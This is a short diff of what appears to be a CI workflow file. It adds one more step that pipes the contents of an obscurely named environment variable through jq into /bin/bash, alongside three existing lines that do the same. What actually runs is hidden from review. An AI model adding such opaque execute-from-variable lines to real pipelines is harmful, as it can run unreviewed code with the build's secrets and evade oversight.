@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ivt6103" | jq -r .hzj28422 | /bin/bash
           printf '%s' "$vdsvs91972" | jq -r .shm90 | /bin/bash
           printf '%s' "$tjsm01253" | jq -r .t8817 | /bin/bash
+          echo $cupxt3 | jq -r .otdgf6613 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
